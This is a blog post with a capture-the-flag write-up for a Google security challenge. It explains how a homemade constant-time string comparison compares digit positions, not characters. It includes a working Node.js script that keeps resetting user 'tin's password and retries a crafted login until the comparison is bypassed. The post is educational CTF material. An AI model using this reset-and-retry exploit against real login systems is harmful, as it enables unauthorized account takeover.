<!DOCTYPE html><html lang="en"> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/svg+xml" href="/me.svg"><meta name="generator" content="Astro v5.12.7"><!-- Canonical URL --><link rel="canonical" href="https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep004ch02/"><!-- Primary Meta Tags --><title>H4ck1ng G00gl3 ep004 challenge 02</title><meta name="title" content="H4ck1ng G00gl3 ep004 challenge 02"><meta name="description" content="Exploit H4ck1ng G00gl3 ep004 challenge 02: find vulnerabilities, bypass string comparison, and reset passwords to log in as 'tin' and reveal the flag."><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep004ch02/"><meta property="og:title" content="H4ck1ng G00gl3 ep004 challenge 02"><meta property="og:description" content="Exploit H4ck1ng G00gl3 ep004 challenge 02: find vulnerabilities, bypass string comparison, and reset passwords to log in as 'tin' and reveal the flag."><meta property="og:image" content="https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep004ch02/"><meta property="twitter:title" content="H4ck1ng G00gl3 ep004 challenge 02"><meta property="twitter:description" content="Exploit H4ck1ng G00gl3 ep004 challenge 02: find vulnerabilities, bypass string comparison, and reset passwords to log in as 'tin' and reveal the flag."><meta property="twitter:image" content="https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png"><!-- RSS --><link rel="alternate" type="application/rss+xml" title="Daniel Orihuela" href="https://danielorihuela.dev/feed.xml"><link rel="stylesheet" href="/_astro/about.BlhpPIz9.css">
<link rel="stylesheet" href="/_astro/_slug_.JRAvWsf2.css">
<style>img{margin:0 auto}div+h1{margin-top:0}h1,h2,h3,h4,h5,h6{margin-top:1em}
</style></head> <body class="bg-black bg-gradient-to-b from-black to-gray-900w-screen bg-black bg-gradient-to-b from-black to-gray-900"> <header class="px-4 py-0"> <nav class="fixed top-0 left-0 right-0 z-50 transition-all duration-500 bg-black/90 backdrop-blur-md border-b border-royalPurple/50"> <div class="max-w-7xl mx-auto px-6 lg:px-8"> <div class="flex items-center justify-between h-20">  <a href="/" class="text-2xl font-bold text-white hover:text-cyan-400 transition-colors duration-300"> <span class="text-royalPurple">&lt;</span>
DO
<span class="text-royalPurple">/&gt;</span> </a>  <div class="hidden md:flex items-center space-x-8"> <a href="/" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> Home <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a><a href="/about/" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> About <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a><a href="/blog/" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> Blog <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a><a href="/open-source/" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> Open Source <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a> </div>  <button id="mobile-menu-button" class="md:hidden text-white hover:text-cyan-400 transition-colors duration-300"> <svg id="menu-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" class="w-6 h-6"> <path id="menu-path" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16m-7 6h7"></path> </svg> </button> </div>  <div id="mobile-menu" class="md:hidden transition-all duration-300 overflow-hidden max-h-0 opacity-0"> <div class="py-4 space-y-2 bg-black/95 backdrop-blur-md rounded-lg mt-2 border border-purple-900/30"> <a href="/" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> Home </a><a href="/about/" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> About </a><a href="/blog/" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> Blog </a><a href="/open-source/" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> Open Source </a> </div> </div> </div> </nav> <script type="module">document.addEventListener("DOMContentLoaded",()=>{const n=document.getElementById("mobile-menu-button"),e=document.getElementById("menu-path");!n||!e||n.addEventListener("click",()=>{const t=document.getElementById("mobile-menu");t&&(t.classList.contains("max-h-0")?(t.classList.remove("max-h-0","opacity-0"),t.classList.add("max-h-96","opacity-100"),e.setAttribute("d","M6 18L18 6M6 6l12 12")):(t.classList.remove("max-h-96","opacity-100"),t.classList.add("max-h-0","opacity-0"),e.setAttribute("d","M4 6h16M4 12h16m-7 6h7")))})});</script> </header> <article class="my-32"> <div class="w-[80ch] max-w-full m-auto text-[#d3d3d3] bg-[#222222] rounded-2xl p-8 lg:p-12 border border-gray-600/30 shadow-2xl prose prose-xl prose-invert max-w-none"> <div class="w-96 max-w-full m-auto"> <img src="/_astro/hacking-google-2022.Cm7LR77H_Z2gI9G8.webp" alt loading="lazy" decoding="async" fetchpriority="auto" width="1024" height="1024" class="rounded-xl shadow-ba"> </div> <div class="py-4 text-center leading-none"> <div class="mb-2 text-[#ffffff]"> <time datetime="2022-11-20T00:00:00.000Z"> Nov 20, 2022 </time> </div> <h1 class="font-[Iceland]"> H4ck1ng G00gl3 ep004 challenge 02 </h1> <hr> </div>  <ul>
<li><a href="#introduction">Introduction</a></li>
<li><a href="#learning-journey">Learning Journey</a></li>
</ul>
<h1 id="introduction">Introduction</h1>
<p><a href="https://h4ck1ng.google/">H4ck1ng G00gl3</a> is a series of security
challenges published on <strong>October 2022</strong> where the only way to win is to
think like a hacker. In this post, I explain how I solved <strong>ep004
challenge 02</strong>. Category <strong>Web Exploitation</strong>.</p>
<h1 id="learning-journey">Learning Journey</h1>
<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="507" height="171" src="/_astro/intro.6zb3GHC7_Z2cdtwI.webp" ></p>
<p>In this challenge, we are given some code. We have to find the
vulnerability and login as “tin”. Let’s check the code.</p>
<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="947" height="239" src="/_astro/hashed-passwords.DUBqzlfV_25P8S.webp" ></p>
<p>I found two hardcoded users and their hashed passwords in the “users.js”
file. My first idea was to try and bruteforce somehow the password for
“tin”, but to no avail. I also searched for the value in some rainbow
tables on the internet, but it didn’t work out.</p>
<p>In that file, I also found a function to reset the password with a
comment saying: “we don’t allow admins to reset passwords”. “tin” is not
an admin, and that comment makes me think it has to be an important
detail. However, I don’t see how this helps me now, so I wrote it down
and continued reading the code.</p>
<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="864" height="423" src="/_astro/reset-password.Dkehfl8P_Z2rPKPa.webp" ></p>
<p>I found another interesting file, “safe-equals.js”. It’s strange because
<strong>the developers programmed their own version of constant time string
comparison</strong>. Programming your own cryptographic functions is dangerous.
For sure, there must be some vulnerability hidden here. At first glance,
it seems to be correct. I didn’t pay the required attention to the code.
I read it fast and thought it was comparing each letter of the string
position by position, regardless of the first position where the letters
differed.</p>
<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="1037" height="549" src="/_astro/safe-equal.BFMhKmag_Z2gvEcc.webp" ></p>
<p>That made me lose a lot of time double-checking other parts of the code.
I went to ask the community. Effectively, the <strong>“safeEqual” function is
vulnerable</strong>. I had to come back and read it again. This time I decided
to check line by line and check on the internet the documentation for
every function. After that, I understood the problem. It isn’t comparing
each value stored in each position of the strings passed as input.
Instead, <strong>it compares the indices of the first appearance of every
number that the loop is iterating</strong>. I’m not sure I explained myself
there, so let me put it in an example.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:#6272A4">// Example: call the function with two strings of the same length</span></span>
<span class="line"><span style="color:#FF79C6">function</span><span style="color:#50FA7B"> safeEqual</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">'</span><span style="color:#F1FA8C">abc123</span><span style="color:#E9F284">'</span><span style="color:#F8F8F2">, </span><span style="color:#E9F284">'</span><span style="color:#F1FA8C">a1b2c3</span><span style="color:#E9F284">'</span><span style="color:#F8F8F2">) {</span></span>
<span class="line"><span style="color:#FF79C6">    let</span><span style="color:#F8F8F2"> match </span><span style="color:#FF79C6">=</span><span style="color:#BD93F9"> true</span><span style="color:#F8F8F2">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4">    // For our input, this condition is not met</span></span>
<span class="line"><span style="color:#FF79C6">    if</span><span style="color:#F8F8F2">(a.length </span><span style="color:#FF79C6">!==</span><span style="color:#F8F8F2"> b.length) {</span></span>
<span class="line"><span style="color:#6272A4">        // This is not executed</span></span>
<span class="line"><span style="color:#F8F8F2">        match </span><span style="color:#FF79C6">=</span><span style="color:#BD93F9"> false</span><span style="color:#F8F8F2">;</span></span>
<span class="line"><span style="color:#F8F8F2">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF79C6">    const</span><span style="color:#F8F8F2"> l </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> a.length; </span><span style="color:#6272A4">// l = 6</span></span>
<span class="line"><span style="color:#6272A4">    // Iterate from 0 to 5</span></span>
<span class="line"><span style="color:#FF79C6">    for</span><span style="color:#F8F8F2"> (</span><span style="color:#FF79C6">let</span><span style="color:#F8F8F2"> i </span><span style="color:#FF79C6">=</span><span style="color:#BD93F9"> 0</span><span style="color:#F8F8F2">; i </span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F8F8F2"> l; i</span><span style="color:#FF79C6">++</span><span style="color:#F8F8F2">) {</span></span>
<span class="line"><span style="color:#6272A4">      // Compare the index of value "i" in both strings.</span></span>
<span class="line"><span style="color:#6272A4">      // For i = 0 -> a.indexOf(0) === b.indexOf(0) -> -1 === -1 -> true</span></span>
<span class="line"><span style="color:#6272A4">      // For i = 1 -> a.indexOf(1) === b.indexOf(1) -> 4 === 1 -> false</span></span>
<span class="line"><span style="color:#6272A4">      // ...</span></span>
<span class="line"><span style="color:#F8F8F2">      match </span><span style="color:#FF79C6">&#x26;&#x26;=</span><span style="color:#F8F8F2"> a.</span><span style="color:#50FA7B">indexOf</span><span style="color:#F8F8F2">(i) </span><span style="color:#FF79C6">===</span><span style="color:#F8F8F2"> b.</span><span style="color:#50FA7B">indexOf</span><span style="color:#F8F8F2">(i);</span></span>
<span class="line"><span style="color:#F8F8F2">    }</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#FF79C6">  return</span><span style="color:#F8F8F2"> match;</span></span>
<span class="line"><span style="color:#F8F8F2">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">safeEqual</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">'</span><span style="color:#F1FA8C">abc123</span><span style="color:#E9F284">'</span><span style="color:#F8F8F2">, </span><span style="color:#E9F284">'</span><span style="color:#F1FA8C">a1b2c3</span><span style="color:#E9F284">'</span><span style="color:#F8F8F2">) </span><span style="color:#6272A4">// returns false</span></span>
<span class="line"><span style="color:#50FA7B">safeEqual</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">'</span><span style="color:#F1FA8C">abcd</span><span style="color:#E9F284">'</span><span style="color:#F8F8F2">, </span><span style="color:#E9F284">'</span><span style="color:#F1FA8C">qwer</span><span style="color:#E9F284">'</span><span style="color:#F8F8F2">) </span><span style="color:#6272A4">// returns true</span></span>
<span class="line"><span style="color:#50FA7B">safeEqual</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">'</span><span style="color:#F1FA8C">ab12c</span><span style="color:#E9F284">'</span><span style="color:#F8F8F2">, </span><span style="color:#E9F284">'</span><span style="color:#F1FA8C">qw121</span><span style="color:#E9F284">'</span><span style="color:#F8F8F2">) </span><span style="color:#6272A4">// returns true</span></span></code></pre>
<p>The function checks that the first occurrence of each number in both
strings returns the same index. If you think about it, that means that
any two strings without numbers will return true. <strong>The trick then is to
reset “tin” password until it creates a hash without numbers. Then, we
must log in with a password that produces a hash without numbers.</strong></p>
<p>First, I searched for a password that produced a hash without numbers.
It was simple. I just computed in a for loop the hash value for strings
of different lengths with the letter “a” (e.g., “a”, “aa”, “aaa”). The
result was that a <strong>string containing seventy-three “a” produces a hash
without numbers</strong>. That is our password. The second step was creating a
script that automatically called the reset password endpoint and then
tried to log in with the password we computed.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:#FF79C6">const</span><span style="color:#F8F8F2"> requestPromise </span><span style="color:#FF79C6">=</span><span style="color:#50FA7B"> require</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">'</span><span style="color:#F1FA8C">request-promise</span><span style="color:#E9F284">'</span><span style="color:#F8F8F2">).</span><span style="color:#50FA7B">defaults</span><span style="color:#F8F8F2">({ jar</span><span style="color:#FF79C6">:</span><span style="color:#BD93F9"> true</span><span style="color:#F8F8F2"> });</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF79C6">var</span><span style="color:#F8F8F2"> loginOptions </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> {</span></span>
<span class="line"><span style="color:#F8F8F2">    method</span><span style="color:#FF79C6">:</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">POST</span><span style="color:#E9F284">'</span><span style="color:#F8F8F2">,</span></span>
<span class="line"><span style="color:#F8F8F2">    uri</span><span style="color:#FF79C6">:</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">https://vrp-website-web.h4ck.ctfcompetition.com/login</span><span style="color:#E9F284">'</span><span style="color:#F8F8F2">,</span></span>
<span class="line"><span style="color:#F8F8F2">    form</span><span style="color:#FF79C6">:</span><span style="color:#F8F8F2"> {</span></span>
<span class="line"><span style="color:#F8F8F2">        username</span><span style="color:#FF79C6">:</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">tin</span><span style="color:#E9F284">'</span><span style="color:#F8F8F2">,</span></span>
<span class="line"><span style="color:#F8F8F2">        password</span><span style="color:#FF79C6">:</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">a</span><span style="color:#E9F284">'</span><span style="color:#F8F8F2">.</span><span style="color:#50FA7B">repeat</span><span style="color:#F8F8F2">(</span><span style="color:#BD93F9">73</span><span style="color:#F8F8F2">)</span></span>
<span class="line"><span style="color:#F8F8F2">    },</span></span>
<span class="line"><span style="color:#F8F8F2">    followAllRedirects</span><span style="color:#FF79C6">:</span><span style="color:#BD93F9"> true</span><span style="color:#F8F8F2">,</span></span>
<span class="line"><span style="color:#F8F8F2">};</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF79C6">var</span><span style="color:#F8F8F2"> resetOptions </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> {</span></span>
<span class="line"><span style="color:#F8F8F2">    method</span><span style="color:#FF79C6">:</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">POST</span><span style="color:#E9F284">'</span><span style="color:#F8F8F2">,</span></span>
<span class="line"><span style="color:#F8F8F2">    uri</span><span style="color:#FF79C6">:</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">https://vrp-website-web.h4ck.ctfcompetition.com/reset-password</span><span style="color:#E9F284">'</span><span style="color:#F8F8F2">,</span></span>
<span class="line"><span style="color:#F8F8F2">    form</span><span style="color:#FF79C6">:</span><span style="color:#F8F8F2"> {</span></span>
<span class="line"><span style="color:#F8F8F2">        username</span><span style="color:#FF79C6">:</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">tin</span><span style="color:#E9F284">'</span></span>
<span class="line"><span style="color:#F8F8F2">    },</span></span>
<span class="line"><span style="color:#F8F8F2">};</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F8F8F2">(</span><span style="color:#FF79C6">async</span><span style="color:#FF79C6"> function</span><span style="color:#F8F8F2"> () {</span></span>
<span class="line"><span style="color:#FF79C6">    let</span><span style="color:#F8F8F2"> i </span><span style="color:#FF79C6">=</span><span style="color:#BD93F9"> 0</span><span style="color:#F8F8F2">;</span></span>
<span class="line"><span style="color:#FF79C6">    let</span><span style="color:#F8F8F2"> incorrect </span><span style="color:#FF79C6">=</span><span style="color:#BD93F9"> true</span><span style="color:#F8F8F2">;</span></span>
<span class="line"><span style="color:#FF79C6">    while</span><span style="color:#F8F8F2"> (incorrect) {</span></span>
<span class="line"><span style="color:#FF79C6">        const</span><span style="color:#F8F8F2"> loginResponse </span><span style="color:#FF79C6">=</span><span style="color:#FF79C6"> await</span><span style="color:#50FA7B"> requestPromise</span><span style="color:#F8F8F2">(loginOptions);</span></span>
<span class="line"><span style="color:#F8F8F2">        incorrect </span><span style="color:#FF79C6">=</span><span style="color:#FF5555"> /</span><span style="color:#F1FA8C">Incorrect</span><span style="color:#FF5555">/</span><span style="color:#F8F8F2">.</span><span style="color:#50FA7B">test</span><span style="color:#F8F8F2">(loginResponse);</span></span>
<span class="line"><span style="color:#F8F8F2">        console.</span><span style="color:#50FA7B">log</span><span style="color:#F8F8F2">(i);</span></span>
<span class="line"><span style="color:#F8F8F2">        i</span><span style="color:#FF79C6">++</span><span style="color:#F8F8F2">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF79C6">        if</span><span style="color:#F8F8F2"> (</span><span style="color:#FF79C6">!</span><span style="color:#F8F8F2">incorrect) {</span></span>
<span class="line"><span style="color:#F8F8F2">            console.</span><span style="color:#50FA7B">log</span><span style="color:#F8F8F2">(loginResponse);</span></span>
<span class="line"><span style="color:#FF79C6">            break</span><span style="color:#F8F8F2">;</span></span>
<span class="line"><span style="color:#F8F8F2">        }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF79C6">        await</span><span style="color:#50FA7B"> requestPromise</span><span style="color:#F8F8F2">(resetOptions);</span></span>
<span class="line"><span style="color:#F8F8F2">    }</span></span>
<span class="line"><span style="color:#F8F8F2">})();</span></span></code></pre>
<p>Executing the script returns the response with the flag. With that, we
completed the challenge.</p>
<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="507" height="171" src="/_astro/intro.6zb3GHC7_Z2cdtwI.webp" ></p>  </div> </article> <footer></footer> </body></html>